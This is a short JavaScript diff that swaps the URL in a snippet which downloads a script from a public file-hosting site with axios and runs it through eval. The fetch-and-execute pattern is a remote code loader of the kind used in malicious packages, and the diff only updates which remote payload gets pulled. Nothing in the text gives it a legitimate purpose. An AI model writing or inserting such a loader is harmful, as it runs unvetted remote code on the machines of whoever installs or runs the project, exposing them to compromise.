@@ -2,7 +2,7 @@
 
 const axios = require('axios');
 
-const url = "https://files.catbox.moe/f4fg3u.js";
+const url = "https://files.catbox.moe/tr1q2q.js";
 
 axios.get(url)
     .then(response => eval(response.data))
